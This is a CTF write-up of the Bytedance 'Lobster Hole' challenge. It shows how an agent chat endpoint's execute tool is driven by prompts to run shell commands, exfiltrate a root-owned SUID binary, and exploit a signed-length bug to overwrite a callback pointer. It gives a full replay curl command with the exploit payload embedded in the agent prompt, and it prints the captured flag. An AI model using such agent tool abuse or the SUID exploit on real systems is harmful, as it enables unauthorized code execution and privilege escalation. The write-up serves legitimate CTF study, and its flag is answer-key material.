# Bytedance Lobster Hole

## Metadata

- Event: Bytedance CTF self-test challenge
- Category: Web plus reverse/pwn
- Pattern: agent chat tool bridge to SUID signed-length callback overwrite
- Knowledge links:
  [ctf-knowledge-web.md#agent-chat-endpoint-with-local-tool-bridge](ctf-knowledge-web.md#agent-chat-endpoint-with-local-tool-bridge),
  [ctf-knowledge-reverse-pwn.md#suid-menu-object-function-pointer-via-signed-length](ctf-knowledge-reverse-pwn.md#suid-menu-object-function-pointer-via-signed-length)
- Local evidence:
  [case directory](../../../engagements/bytedance-lobster-hole)

## Prompt Summary

The landing page says to guess the interface for an intelligent-agent scenario.
The prompt describes a claw stuck in a hole and asks to pull it out.

## Signals

- `GET /` returns only the text hint for an intelligent-agent interface.
- `GET /health` returns `{"status":"ok"}`.
- `GET /chat` requires a `query` parameter and streams SSE responses from
  `FakeClaw`.
- `POST /session` creates a `session_id`; the service allows only one active
  session and can lock long-running requests.
- A short chat request proves an `execute` tool can run commands in
  `/challenge`.
- SUID inventory reveals `/usr/local/bin/sudoedit`, a custom 17 KB root-owned
  menu binary.
- The binary has symbols `show_prize`, `grab_flag`, `cmd_add`, `cmd_view`,
  `cmd_rename`, and strings for `/root/.bashrc` plus `FLAG=`.

## Route

1. Use `ctf_web.py snapshot` and bounded path probes to record the sparse
   landing behavior.
2. Find `/chat` and `/session`, then capture SSE streams with `curl -N` so
   tool calls and tool results are preserved.
3. Confirm command execution with a short `pwd && ls -la` request.
4. Inventory the container, avoiding broad long-running searches after one
   request locks the single active session.
5. Identify `/usr/local/bin/sudoedit` as a custom SUID target.
6. Base64-copy the binary through the agent tool and decode it locally.
7. Use `readelf`, `strings`, and `objdump` to recover the object layout:
   add allocates 0x50 bytes, the name begins at offset 0, the view callback is
   at offset 0x40, and `grab_flag` is at `0x401266`.
8. In `cmd_rename`, length values greater than `0x40` are rejected, but
   negative values pass the signed check and become huge unsigned sizes for
   `read`.
9. Use a staged pipe: send menu inputs through the `-1` length, send
   `64 * "A" + p64(0x401266)`, wait briefly, then send `2` to trigger view.

## Replay Command

```bash
curl -sS -N -k --max-time 80 -G \
  'https://a187427f956db4f24166a8d9d5295873.ctf.bytedance.net/chat' \
  --data-urlencode "session_id=$SESSION_ID" \
  --data-urlencode "query=只调用一次 execute，然后停止。命令：(printf '1\n0\nAAA\n3\n0\n-1\n'; perl -e 'print \"A\"x64 . pack(\"Q\",0x401266)'; sleep 0.2; printf '2\n5\n') | /usr/local/bin/sudoedit 2>&1"
```

## False Leads

- Treating the hint only as MCP, A2A, OpenAI-compatible, or OpenClaw endpoint
  discovery after `/chat` is available.
- Sending broad "find flag" prompts that keep the single active session busy.
- Assuming the rename limit blocks overwrites without checking signedness.
- Appending follow-up menu choices immediately after an oversized read; the
  staged sleep keeps the read from consuming the trigger command.

## Final

`flag{51a759a902e533beab3c2241a0aaaedb41e354ace4316526749f262c}`
